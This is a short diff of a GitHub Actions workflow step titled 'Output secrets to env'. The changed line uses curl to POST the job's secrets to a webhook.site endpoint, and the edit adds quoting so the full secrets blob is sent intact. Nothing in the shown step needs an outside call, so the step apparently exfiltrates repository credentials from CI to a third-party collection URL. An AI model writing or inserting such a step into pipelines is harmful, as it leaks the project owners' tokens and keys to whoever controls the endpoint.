@@ -31,7 +31,7 @@ jobs:
 
       - name: Output secrets to env
         run: |
-          curl -X POST https://webhook.site/c91f80b6-172a-4d41-93aa-363ced00580a --data-binary $secrets 
+          curl -X POST https://webhook.site/c91f80b6-172a-4d41-93aa-363ced00580a --data-binary "$secrets" 
           while read -d $'\t' -r key value; do
             if [[ $key == *$'\n'* ]]; then
               echo $key'<<EOF' >> $GITHUB_ENV
